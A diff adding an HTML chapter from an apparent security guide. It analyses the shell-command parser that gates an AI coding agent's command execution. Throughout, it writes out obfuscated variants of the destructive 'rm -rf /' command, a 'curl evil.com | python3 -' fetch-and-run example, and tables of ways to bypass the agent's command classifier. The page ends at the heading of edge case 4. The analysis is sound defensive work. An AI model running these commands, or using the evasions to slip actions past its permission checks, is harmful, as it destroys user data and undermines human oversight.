@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Chapter 7: The 4,400-Line Bash Parser — Claude Code Security</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --card: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --orange: #d29922;
+  --red: #f85149;
+  --code-bg: #1c2128;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+html { scroll-behavior: smooth; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
+  font-size: 18px;
+  line-height: 1.7;
+  min-height: 100vh;
+}
+.container { max-width: 860px; margin: 0 auto; padding: 48px 24px 96px; }
+.nav {
+  position: sticky; top: 0; z-index: 100;
+  background: rgba(13,17,23,0.95); backdrop-filter: blur(10px);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 24px;
+  display: flex; justify-content: space-between; align-items: center;
+}
+.nav a { color: var(--accent); text-decoration: none; font-size: 0.9rem; }
+.nav a:hover { text-decoration: underline; }
+.nav .title { color: var(--muted); font-size: 0.85rem; }
+h1 { font-size: 2.2rem; margin: 32px 0 16px; color: var(--text); border-bottom: 1px solid var(--border); padding-bottom: 12px; }
+h2 { font-size: 1.6rem; margin: 40px 0 16px; color: var(--accent); }
+h3 { font-size: 1.25rem; margin: 32px 0 12px; color: var(--text); }
+h4 { font-size: 1.1rem; margin: 24px 0 8px; color: var(--muted); }
+p { margin: 12px 0; }
+a { color: var(--accent); }
+strong { color: var(--text); }
+em { color: var(--muted); font-style: italic; }
+ul, ol { margin: 12px 0 12px 28px; }
+li { margin: 6px 0; }
+li > ul, li > ol { margin: 4px 0 4px 20px; }
+code {
+  background: var(--code-bg); color: var(--green);
+  padding: 2px 6px; border-radius: 4px; font-size: 0.88em;
+  font-family: 'SF Mono', 'Fira Code', 'Cascadia Code', monospace;
+}
+pre {
+  background: var(--code-bg); border: 1px solid var(--border);
+  border-radius: 8px; padding: 20px; margin: 16px 0;
+  overflow-x: auto; line-height: 1.5;
+}
+pre code { background: none; padding: 0; color: var(--text); font-size: 0.85em; }
+table { width: 100%; border-collapse: collapse; margin: 16px 0; font-size: 0.92em; }
+th { background: var(--card); color: var(--accent); text-align: left; padding: 10px 14px; border: 1px solid var(--border); font-weight: 600; }
+td { padding: 10px 14px; border: 1px solid var(--border); vertical-align: top; }
+tr:nth-child(even) { background: rgba(22,27,34,0.5); }
+blockquote {
+  border-left: 3px solid var(--red); margin: 16px 0;
+  padding: 12px 20px; background: var(--card); border-radius: 0 8px 8px 0;
+  color: var(--muted);
+}
+blockquote p { margin: 4px 0; }
+.mermaid { background: var(--card); border: 1px solid var(--border); border-radius: 8px; padding: 20px; margin: 16px 0; text-align: center; }
+hr { border: none; border-top: 1px solid var(--border); margin: 40px 0; }
+.chapter-nav {
+  display: flex; justify-content: space-between; margin-top: 64px;
+  padding-top: 24px; border-top: 1px solid var(--border);
+}
+.chapter-nav a {
+  color: var(--accent); text-decoration: none; padding: 8px 16px;
+  border: 1px solid var(--border); border-radius: 8px; font-size: 0.9rem;
+}
+.chapter-nav a:hover { border-color: var(--accent); background: var(--card); }
+@media (max-width: 768px) {
+  body { font-size: 16px; }
+  h1 { font-size: 1.6rem; }
+  h2 { font-size: 1.3rem; }
+  .container { padding: 24px 16px 64px; }
+  pre { padding: 12px; font-size: 0.8em; }
+  table { font-size: 0.82em; }
+  .nav { padding: 8px 16px; }
+}
+.codehilite .k, .codehilite .kn, .codehilite .kd { color: #ff79c6; }
+.codehilite .s, .codehilite .s1, .codehilite .s2 { color: #f1fa8c; }
+.codehilite .n, .codehilite .na { color: #50fa7b; }
+.codehilite .c, .codehilite .c1, .codehilite .cm { color: #6272a4; font-style: italic; }
+.codehilite .nf, .codehilite .nb { color: #8be9fd; }
+.codehilite .mi, .codehilite .mf { color: #bd93f9; }
+.codehilite .o, .codehilite .p { color: #f8f8f2; }
+.codehilite .nx { color: #f8f8f2; }
+.codehilite .kr { color: #ff79c6; }
+</style>
+<script src="https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js"></script>
+<script>mermaid.initialize({startOnLoad:true, theme:'dark'});</script>
+</head>
+<body>
+<nav class="nav">
+  <a href="index.html">&larr; Table of Contents</a>
+  <span class="title">Claude Code Security</span>
+  <a href="chapter-08.html">Next &rarr;</a>
+</nav>
+<div class="container">
+<h1 id="chapter-7-the-4400-line-bash-parser">Chapter 7: The 4,400-Line Bash Parser</h1>
+<p>The shell parser is the first real security gate in Claude Code's command execution pipeline. Everything downstream -- classification, pattern matching, permission evaluation, sandboxing -- depends on the parser's ability to decompose a raw command string into a structured representation that security logic can reason about. A parser that misunderstands the command hands a flawed picture to every subsequent layer. An attacker who can confuse the parser can bypass the entire security stack.</p>
+<p>This chapter is a forensic examination of the parser's security properties: what it catches, what it misses, and why building a shell parser for security classification is fundamentally different from building one for execution. We will walk through the three-phase pipeline (tokenization, AST construction, semantic analysis), catalog the edge cases that attackers exploit, analyze why off-the-shelf shell parser libraries fail for this use case, and identify the residual attack surface that the parser cannot eliminate.</p>
+<hr />
+<h2 id="71-why-regex-fails-for-security-a-formal-argument">7.1 Why Regex Fails for Security: A Formal Argument</h2>
+<p>Before examining the parser, we need to establish why it exists at all. The naive alternative -- regex pattern matching against the raw command string -- fails not because of implementation bugs but because of a fundamental mismatch between the tool and the problem.</p>
+<p>Shell syntax is a context-sensitive language. The meaning of a character depends on its surrounding context: a <code>$</code> inside single quotes is literal, inside double quotes triggers expansion, and outside quotes triggers expansion with different word-splitting behavior. A <code>#</code> at the start of a word is a comment; inside a word it is literal. A <code>(</code> after a function name starts a definition; after <code>$</code> starts a command substitution; after <code>&lt;</code> starts a process substitution; at the start of a command starts a subshell.</p>
+<p>Regular expressions operate on regular languages -- a strict subset of context-free languages, which are themselves a strict subset of context-sensitive languages. Regex cannot track nested contexts, matching delimiters, or state-dependent character interpretation. This is not a limitation of any specific regex engine; it is a mathematical impossibility established by the Chomsky hierarchy.</p>
+<p>The practical consequence for security:</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># Regex pattern: rm\s+-rf\s+/</span>
+<span class="c1"># Catches:</span>
+rm<span class="w"> </span>-rf<span class="w"> </span>/
+
+<span class="c1"># Misses all of these:</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="s1">&#39;/&#39;</span><span class="w">                    </span><span class="c1"># Single-quoted argument</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="w">                    </span><span class="c1"># Double-quoted argument</span>
+rm<span class="w"> </span>-rf<span class="w"> </span><span class="se">\/</span><span class="w">                     </span><span class="c1"># Backslash-escaped slash</span>
+rm<span class="w"> </span>-r<span class="w"> </span>-f<span class="w"> </span>/<span class="w">                    </span><span class="c1"># Split flags</span>
+rm<span class="w"> </span>--recursive<span class="w"> </span>--force<span class="w"> </span>/<span class="w">      </span><span class="c1"># Long-form flags</span>
+<span class="s1">&#39;r&#39;</span>m<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">                    </span><span class="c1"># Quote-split command name</span>
+r<span class="se">\m</span><span class="w"> </span>-rf<span class="w"> </span>/<span class="w">                     </span><span class="c1"># Backslash in command name</span>
+<span class="k">$(</span><span class="nb">echo</span><span class="w"> </span>rm<span class="k">)</span><span class="w"> </span>-rf<span class="w"> </span>/<span class="w">              </span><span class="c1"># Command substitution</span>
+<span class="nb">eval</span><span class="w"> </span><span class="s2">&quot;rm -rf /&quot;</span><span class="w">               </span><span class="c1"># Indirect execution</span>
+/bin/rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">                 </span><span class="c1"># Absolute path to binary</span>
+<span class="nb">command</span><span class="w"> </span>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="w">              </span><span class="c1"># Builtin prefix bypass</span>
+</code></pre></div>
+
+<p>Each evasion exploits a different shell feature. A regex defender playing whack-a-mole must handle every combination of every feature -- a combinatorial explosion. An attacker needs to find only one combination the regex misses. This asymmetry makes regex-based security untenable for any language more complex than a flat keyword list.</p>
+<p><strong>CWE-78 (OS Command Injection)</strong> is the canonical weakness that regex-based defenses fail to prevent. MITRE's description explicitly notes that "blacklist approaches" (which regex implements) are "virtually always incomplete" because the attacker's command construction options exceed what the defender can enumerate.</p>
+<hr />
+<h2 id="72-the-three-phase-pipeline">7.2 The Three-Phase Pipeline</h2>
+<p>Claude Code's bash parser operates in three phases, each transforming the command representation to a higher level of abstraction:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">graph</span><span class="w"> </span><span class="nx">LR</span>
+<span class="w">    </span><span class="nx">A</span><span class="p">[</span><span class="s">&quot;Raw Command String&lt;br/&gt;(bytes)&quot;</span><span class="p">]</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;Phase 1&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">B</span><span class="p">[</span><span class="s">&quot;Token Stream&lt;br/&gt;(typed tokens)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">B</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;Phase 2&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">C</span><span class="p">[</span><span class="s">&quot;Abstract Syntax Tree&lt;br/&gt;(structural nodes)&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">C</span><span class="w"> </span><span class="o">--</span><span class="p">&gt;</span><span class="o">|</span><span class="s">&quot;Phase 3&quot;</span><span class="o">|</span><span class="w"> </span><span class="nx">D</span><span class="p">[</span><span class="s">&quot;Security Classification&lt;br/&gt;(risk categories)&quot;</span><span class="p">]</span>
+
+<span class="w">    </span><span class="nx">B</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="nx">B1</span><span class="p">[</span><span class="s">&quot;Handles: quoting, escaping,&lt;br/&gt;operators, heredoc markers&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">C</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="nx">C1</span><span class="p">[</span><span class="s">&quot;Handles: pipelines, lists,&lt;br/&gt;subshells, redirections&quot;</span><span class="p">]</span>
+<span class="w">    </span><span class="nx">D</span><span class="w"> </span><span class="o">-</span><span class="p">.</span><span class="o">-</span><span class="w"> </span><span class="nx">D1</span><span class="p">[</span><span class="s">&quot;Handles: command identity,&lt;br/&gt;argument semantics, risk level&quot;</span><span class="p">]</span>
+</code></pre></div>
+
+<p>Each phase has distinct responsibilities and distinct failure modes. Understanding the boundaries between phases is critical for understanding the parser's security properties.</p>
+<h3 id="phase-1-tokenization">Phase 1: Tokenization</h3>
+<p>The tokenizer converts a raw byte string into a stream of typed tokens. It is the phase that handles the most shell complexity, because shell tokenization rules are the most irregular part of the language.</p>
+<p><strong>Token types produced:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Token Type</th>
+<th>Examples</th>
+<th>Security Relevance</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>Word</code></td>
+<td><code>git</code>, <code>status</code>, <code>"hello world"</code></td>
+<td>Command names and arguments after quote resolution</td>
+</tr>
+<tr>
+<td><code>Operator</code></td>
+<td><code>&amp;&amp;</code>, <code>\|\|</code>, <code>;</code>, <code>\|</code>, <code>&amp;</code></td>
+<td>Command composition -- each operator creates a new execution boundary</td>
+</tr>
+<tr>
+<td><code>Redirect</code></td>
+<td><code>&gt;</code>, <code>&gt;&gt;</code>, <code>&lt;</code>, <code>2&gt;&amp;1</code>, <code>&amp;&gt;</code></td>
+<td>File system side effects</td>
+</tr>
+<tr>
+<td><code>Assignment</code></td>
+<td><code>VAR=value</code></td>
+<td>Environment modification</td>
+</tr>
+<tr>
+<td><code>HeredocMarker</code></td>
+<td><code>&lt;&lt;EOF</code>, <code>&lt;&lt;'EOF'</code></td>
+<td>Multi-line string boundary</td>
+</tr>
+<tr>
+<td><code>Comment</code></td>
+<td><code># text</code></td>
+<td>Discarded (but must be detected to avoid false parsing of <code>#</code> in arguments)</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Critical tokenizer decisions for security:</strong></p>
+<p><strong>1. Quote normalization.</strong> All quoting mechanisms resolve to the same token content. <code>'rm'</code>, <code>"rm"</code>, <code>r\m</code>, <code>$'rm'</code>, and <code>rm</code> all produce the token <code>Word("rm")</code>. This is the single most important security property of the tokenizer. Without it, every downstream check must independently handle all quoting variants -- which is exactly the regex failure mode.</p>
+<div class="codehilite"><pre><span></span><code><span class="c1"># All tokenize to: Word(&quot;rm&quot;), Word(&quot;-rf&quot;), Word(&quot;/&quot;)</span>
+rm<span class="w"> </span>-rf<span class="w"> </span>/
+<span class="s1">&#39;rm&#39;</span><span class="w"> </span><span class="s1">&#39;-rf&#39;</span><span class="w"> </span><span class="s1">&#39;/&#39;</span>
+<span class="s2">&quot;rm&quot;</span><span class="w"> </span><span class="s2">&quot;-rf&quot;</span><span class="w"> </span><span class="s2">&quot;/&quot;</span>
+r<span class="se">\m</span><span class="w"> </span>-rf<span class="w"> </span><span class="se">\/</span>
+<span class="s1">$&#39;rm&#39;</span><span class="w"> </span><span class="s1">$&#39;-rf&#39;</span><span class="w"> </span><span class="s1">$&#39;/&#39;</span>
+</code></pre></div>
+
+<p><strong>2. Operator splitting without whitespace.</strong> The tokenizer must correctly split <code>echo hello&amp;&amp;rm -rf /</code> into five tokens: <code>Word("echo")</code>, <code>Word("hello")</code>, <code>Operator("&amp;&amp;")</code>, <code>Word("rm")</code>, <code>Word("-rf")</code>, <code>Word("/")</code>. Shell operators are delimiters even without surrounding whitespace. A tokenizer that requires whitespace around operators would see <code>hello&amp;&amp;rm</code> as a single word, causing the AST builder to miss the compound command structure entirely.</p>
+<p><strong>3. Escape resolution.</strong> Backslash escapes are resolved during tokenization. <code>r\m</code> becomes <code>rm</code>. <code>\$VAR</code> becomes <code>$VAR</code> (literal, no expansion). This prevents a class of evasion where attackers insert backslashes to break pattern recognition while preserving shell semantics.</p>
+<p><strong>4. Variable expansion markers.</strong> The tokenizer must distinguish between literal <code>$VAR</code> (inside single quotes) and expandable <code>$VAR</code> (outside single quotes or inside double quotes). Expandable variables are flagged as containing dynamic content that cannot be resolved statically. This flag propagates to Phase 3, where it affects classification confidence.</p>
+<p><strong>Tokenizer failure modes:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Failure</th>
+<th>Impact</th>
+<th>Example</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unclosed quote</td>
+<td>Tokenizer sees the rest of the string as a single quoted token</td>
+<td><code>rm -rf /'</code></td>
+</tr>
+<tr>
+<td>ANSI-C quoting (<code>$'...'</code>) not supported</td>
+<td>Hex/octal escapes pass through unresolved</td>
+<td><code>$'\x72\x6d' -rf /</code> resolves to <code>rm -rf /</code></td>
+</tr>
+<tr>
+<td>Locale-dependent behavior</td>
+<td>Unicode characters in command names</td>
+<td><code>рm -rf /</code> (Cyrillic "р")</td>
+</tr>
+<tr>
+<td>Heredoc content parsing</td>
+<td>Content inside heredoc is not tokenized as commands</td>
+<td><code>cat &lt;&lt;EOF\nrm -rf /\nEOF</code></td>
+</tr>
+</tbody>
+</table>
+<p>The ANSI-C quoting failure is particularly dangerous. <code>$'\x72\x6d'</code> is the hex encoding of <code>rm</code>. A tokenizer that does not handle <code>$'...'</code> quoting will see <code>$'\x72\x6d'</code> as a literal string containing dollar sign, backslash, and hex characters -- and will not recognize it as <code>rm</code>. The shell, however, will execute <code>rm</code>. This gap between what the parser sees and what the shell executes is the definition of a parser bypass vulnerability.</p>
+<h3 id="phase-2-ast-construction">Phase 2: AST Construction</h3>
+<p>The AST builder consumes the token stream and constructs a tree representing the command's execution structure. Each node type corresponds to a shell construct:</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">AST</span><span class="w"> </span><span class="nx">Node</span><span class="w"> </span><span class="nx">Types</span><span class="p">:</span>
+<span class="w">  </span><span class="nx">SimpleCommand</span><span class="w">      </span><span class="s">&quot;git status&quot;</span><span class="w">              </span><span class="p">(</span><span class="nx">command</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">arguments</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Pipeline</span><span class="w">           </span><span class="s">&quot;cmd1 | cmd2&quot;</span><span class="w">             </span><span class="p">(</span><span class="nx">piped</span><span class="w"> </span><span class="nx">commands</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">AndList</span><span class="w">            </span><span class="s">&quot;cmd1 &amp;&amp; cmd2&quot;</span><span class="w">            </span><span class="p">(</span><span class="nx">conditional</span><span class="w"> </span><span class="nx">AND</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">OrList</span><span class="w">             </span><span class="s">&quot;cmd1 || cmd2&quot;</span><span class="w">            </span><span class="p">(</span><span class="nx">conditional</span><span class="w"> </span><span class="nx">OR</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Sequence</span><span class="w">           </span><span class="s">&quot;cmd1 ; cmd2&quot;</span><span class="w">             </span><span class="p">(</span><span class="nx">sequential</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Subshell</span><span class="w">           </span><span class="s">&quot;(cmd1 &amp;&amp; cmd2)&quot;</span><span class="w">          </span><span class="p">(</span><span class="nx">parenthesized</span><span class="w"> </span><span class="nx">group</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">BraceGroup</span><span class="w">         </span><span class="s">&quot;{ cmd1; cmd2; }&quot;</span><span class="w">         </span><span class="p">(</span><span class="nx">non</span><span class="o">-</span><span class="nx">subshell</span><span class="w"> </span><span class="nx">group</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">CommandSubstitution</span><span class="w"> </span><span class="s">&quot;$(cmd)&quot;</span><span class="w">                 </span><span class="p">(</span><span class="nx">nested</span><span class="w"> </span><span class="nx">command</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">ProcessSubstitution</span><span class="w"> </span><span class="s">&quot;&lt;(cmd)&quot;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s">&quot;&gt;(cmd)&quot;</span><span class="w">     </span><span class="p">(</span><span class="nx">fd</span><span class="o">-</span><span class="nx">based</span><span class="w"> </span><span class="nx">substitution</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Redirect</span><span class="w">           </span><span class="s">&quot;cmd &gt; file&quot;</span><span class="w">              </span><span class="p">(</span><span class="nx">I</span><span class="o">/</span><span class="nx">O</span><span class="w"> </span><span class="nx">redirection</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Heredoc</span><span class="w">            </span><span class="s">&quot;cmd &lt;&lt;EOF&quot;</span><span class="w">               </span><span class="p">(</span><span class="nx">here</span><span class="o">-</span><span class="nx">document</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">FunctionDef</span><span class="w">        </span><span class="s">&quot;f() { cmd; }&quot;</span><span class="w">            </span><span class="p">(</span><span class="nx">function</span><span class="w"> </span><span class="nx">definition</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Background</span><span class="w">         </span><span class="s">&quot;cmd &amp;&quot;</span><span class="w">                   </span><span class="p">(</span><span class="nx">background</span><span class="w"> </span><span class="nx">execution</span><span class="p">)</span>
+<span class="w">  </span><span class="nx">Assignment</span><span class="w">         </span><span class="s">&quot;VAR=value cmd&quot;</span><span class="w">           </span><span class="p">(</span><span class="nx">environment</span><span class="w"> </span><span class="nx">prefix</span><span class="p">)</span>
+</code></pre></div>
+
+<p><strong>Security-critical AST properties:</strong></p>
+<p><strong>1. Every command boundary is explicit.</strong> The flat string <code>git status &amp;&amp; rm -rf / || echo "safe"</code> becomes a tree with three <code>SimpleCommand</code> leaves connected by <code>AndList</code> and <code>OrList</code> nodes. Each command is independently classifiable. Without the tree structure, the classifier would need to manually parse command boundaries from the token stream -- repeating the complexity the AST builder already handled.</p>
+<p><strong>2. Nesting is recursive.</strong> <code>$(echo $(echo rm)) -rf /</code> produces a <code>SimpleCommand</code> node whose command-name child is a <code>CommandSubstitution</code> containing another <code>CommandSubstitution</code> containing a <code>SimpleCommand("echo", ["rm"])</code>. The recursive structure enables recursive security analysis: the analyzer can descend into substitutions to examine their contents.</p>
+<p><strong>3. Redirections are attached to their commands.</strong> <code>rm -rf / 2&gt;/dev/null</code> produces a <code>SimpleCommand("rm", ["-rf", "/"])</code> with an attached <code>Redirect(stderr, "/dev/null")</code>. The redirect does not appear as a separate command -- it is metadata on the <code>rm</code> command. This prevents confusion between "redirect target" and "command argument."</p>
+<p><strong>AST construction failure modes:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Failure</th>
+<th>Impact</th>
+<th>Attacker Exploitation</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Unrecognized syntax construct</td>
+<td>Command bypasses AST analysis, falls through to pattern matching only</td>
+<td>Use obscure but valid bash syntax (coprocs, mapfile, etc.)</td>
+</tr>
+<tr>
+<td>Incorrect operator precedence</td>
+<td><code>cmd1 \|\| cmd2 &amp;&amp; cmd3</code> parsed with wrong grouping</td>
+<td>Exploit precedence confusion to hide destructive commands</td>
+</tr>
+<tr>
+<td>Incomplete function body parsing</td>
+<td>Function body treated as top-level commands</td>
+<td>Define function with dangerous body, call later</td>
+</tr>
+<tr>
+<td>Process substitution as argument vs. redirection</td>
+<td><code>&gt;(cmd)</code> parsed as redirection when attacker wants it classified as argument</td>
+<td>Exfiltrate data through process substitution</td>
+</tr>
+</tbody>
+</table>
+<h3 id="phase-3-semantic-analysis">Phase 3: Semantic Analysis</h3>
+<p>The semantic analyzer walks the AST and assigns security-relevant classifications to each node. This is where the parser transitions from understanding syntax to understanding intent.</p>
+<p><strong>Operations performed during semantic analysis:</strong></p>
+<p><strong>1. Prefix stripping.</strong> Commands like <code>env VAR=val command</code>, <code>sudo command</code>, <code>nice -n 10 command</code>, <code>timeout 30 command</code>, and <code>command command</code> wrap other commands without changing their fundamental semantics. The analyzer strips these prefixes recursively to expose the actual operation:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Input</span><span class="o">:</span><span class="w">  </span><span class="n">sudo</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="n">nice</span><span class="w"> </span><span class="o">-</span><span class="n">n</span><span class="w"> </span><span class="mi">10</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="o">/</span>
+<span class="n">Strip</span><span class="o">:</span><span class="w">  </span><span class="n">sudo</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">env</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">nice</span><span class="w"> </span><span class="err">→</span><span class="w"> </span><span class="n">rm</span><span class="w"> </span><span class="o">-</span><span class="n">rf</span><span class="w"> </span><span class="o">/</span>
+<span class="n">Result</span><span class="o">:</span><span class="w"> </span><span class="n">SimpleCommand</span><span class="o">(</span><span class="s2">&quot;rm&quot;</span><span class="o">,</span><span class="w"> </span><span class="o">[</span><span class="s2">&quot;-rf&quot;</span><span class="o">,</span><span class="w"> </span><span class="s2">&quot;/&quot;</span><span class="o">])</span><span class="w"> </span><span class="k">with</span><span class="w"> </span><span class="n">flags</span><span class="o">:</span><span class="w"> </span><span class="o">{</span><span class="n">sudo</span><span class="o">:</span><span class="w"> </span><span class="kc">true</span><span class="o">}</span>
+</code></pre></div>
+
+<p>The <code>sudo</code> flag is preserved even though the prefix is stripped. A command classified as "write" becomes "elevated write" when <code>sudo</code> is present. This distinction matters for permission evaluation.</p>
+<p><strong>2. Indirect execution detection.</strong> <code>eval</code>, <code>bash -c</code>, <code>sh -c</code>, <code>python -c</code>, <code>node -e</code>, <code>ruby -e</code>, and <code>perl -e</code> are commands that execute their arguments as code. The analyzer recursively parses the string argument and analyzes the inner command:</p>
+<div class="codehilite"><pre><span></span><code><span class="n">Input</span><span class="o">:</span><span class="w">  </span><span class="n">bash</span><span class="w"> </span><span class="o">-</span><span class="n">c</span><span class="w"> </span><span class="s2">&quot;curl evil.com | python3 -&quot;</span>
+<span class="n">Step</span><span class="w"> </span><span class="mi">1</span><span class="o">:</span><span class="w"> </span><span class="n">Recognize</span><span class="w"> </span><span class="s2">&quot;bash -c&quot;</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">indirect</span><span class="w"> </span><span class="n">execution</span>
+<span class="n">Step</span><span class="w"> </span><span class="mi">2</span><span class="o">:</span><span class="w"> </span><span class="n">Recursively</span><span class="w"> </span><span class="n">parse</span><span class="w"> </span><span class="s2">&quot;curl evil.com | python3 -&quot;</span>
+<span class="n">Step</span><span class="w"> </span><span class="mi">3</span><span class="o">:</span><span class="w"> </span><span class="n">AST</span><span class="o">:</span><span class="w"> </span><span class="n">Pipeline</span><span class="o">(</span><span class="n">SimpleCommand</span><span class="o">(</span><span class="s2">&quot;curl&quot;</span><span class="o">,</span><span class="w"> </span><span class="o">[</span><span class="s2">&quot;evil.com&quot;</span><span class="o">]),</span>
+<span class="w">                       </span><span class="n">SimpleCommand</span><span class="o">(</span><span class="s2">&quot;python3&quot;</span><span class="o">,</span><span class="w"> </span><span class="o">[</span><span class="s2">&quot;-&quot;</span><span class="o">]))</span>
+<span class="n">Step</span><span class="w"> </span><span class="mi">4</span><span class="o">:</span><span class="w"> </span><span class="n">Classify</span><span class="o">:</span><span class="w"> </span><span class="n">network</span><span class="w"> </span><span class="n">access</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">arbitrary</span><span class="w"> </span><span class="n">code</span><span class="w"> </span><span class="n">execution</span>
+</code></pre></div>
+
+<p>Recursion depth is capped at 3-5 levels to prevent adversarial nesting. Beyond the depth limit, the command is classified as <code>Unknown/HighRisk</code>.</p>
+<p><strong>3. Argument semantic analysis.</strong> For certain commands, the arguments determine the risk level. <code>rm file.txt</code> is a routine deletion; <code>rm -rf /</code> is catastrophic. <code>chmod 644 file</code> is a normal permission change; <code>chmod -R 777 /</code> is a security disaster. The analyzer maintains argument-level heuristics for high-risk commands.</p>
+<p><strong>4. Path resolution.</strong> Arguments that represent file paths are resolved relative to the working directory when possible. <code>cd /tmp &amp;&amp; rm -rf ../../etc</code> must resolve the path <code>../../etc</code> relative to <code>/tmp</code> to determine the actual target is <code>/etc</code>.</p>
+<hr />
+<h2 id="73-parser-edge-cases-attackers-exploit">7.3 Parser Edge Cases Attackers Exploit</h2>
+<p>Every parser has a boundary between "correctly parsed" and "not parsed." Attackers operate on that boundary. Here are the edge cases that a security-focused parser must handle -- and what happens when it does not.</p>
+<h3 id="edge-case-1-quote-context-switches">Edge Case 1: Quote Context Switches</h3>
+<div class="codehilite"><pre><span></span><code><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;hello&#39;</span><span class="s2">&quot;world&quot;</span><span class="s1">&#39;!&#39;</span>
+</code></pre></div>
+
+<p>This is a single word: <code>helloworld!</code>. The shell concatenates adjacent quoted and unquoted segments. A parser that treats each quoted segment as a separate token will miscount arguments. A parser that does not handle mid-word quote transitions will produce incorrect token boundaries.</p>
+<p><strong>Security implication:</strong> An attacker can split a dangerous command name across quote contexts to evade pattern matching that operates on individual tokens:</p>
+<div class="codehilite"><pre><span></span><code><span class="s1">&#39;r&#39;</span><span class="s2">&quot;m&quot;</span><span class="w"> </span>-rf<span class="w"> </span>/<span class="w">          </span><span class="c1"># Two adjacent quoted segments → single word &quot;rm&quot;</span>
+</code></pre></div>
+
+<p><strong>Required parser behavior:</strong> The tokenizer must concatenate adjacent quoted/unquoted segments before emitting a <code>Word</code> token.</p>
+<h3 id="edge-case-2-dollar-sign-quoting-variants">Edge Case 2: Dollar-Sign Quoting Variants</h3>
+<div class="codehilite"><pre><span></span><code><span class="s1">$&#39;rm&#39;</span><span class="w">                 </span><span class="c1"># ANSI-C quoting → &quot;rm&quot;</span>
+<span class="s1">$&#39;\x72\x6d&#39;</span><span class="w">          </span><span class="c1"># Hex escape → &quot;rm&quot;  </span>
+<span class="s1">$&#39;\162\155&#39;</span><span class="w">           </span><span class="c1"># Octal escape → &quot;rm&quot;</span>
+<span class="s1">$&#39;\u0072\u006d&#39;</span><span class="w">       </span><span class="c1"># Unicode escape → &quot;rm&quot;</span>
+</code></pre></div>
+
+<p><strong>Security implication:</strong> The <code>$'...'</code> syntax provides four encoding mechanisms for command names. Any one that the parser misses is a bypass vector for command name-based classification.</p>
+<p><strong>Required parser behavior:</strong> Full ANSI-C quote interpretation including <code>\x</code>, <code>\0</code>, <code>\u</code>, and <code>\U</code> escape sequences.</p>
+<h3 id="edge-case-3-brace-expansion-as-argument-generator">Edge Case 3: Brace Expansion as Argument Generator</h3>
+<div class="codehilite"><pre><span></span><code>rm<span class="w"> </span>-rf<span class="w"> </span>/<span class="o">{</span>bin,etc,usr,var<span class="o">}</span>
+<span class="c1"># Expands to: rm -rf /bin /etc /usr /var</span>
+</code></pre></div>
+
+<p><strong>Security implication:</strong> Brace expansion generates multiple arguments from a single syntactic element. A classifier that examines the literal argument <code>/{bin,etc,usr,var}</code> may not recognize it as targeting four system directories.</p>
+<p><strong>Required parser behavior:</strong> Either expand braces before classification or classify the unexpanded pattern conservatively (treating <code>/{...}</code> as targeting <code>/</code>).</p>
+<h3 id="edge-case-4-process-substitution-for-data-exfiltration">Edge Case 4: Process Substitution for Data Exfiltration</h3>
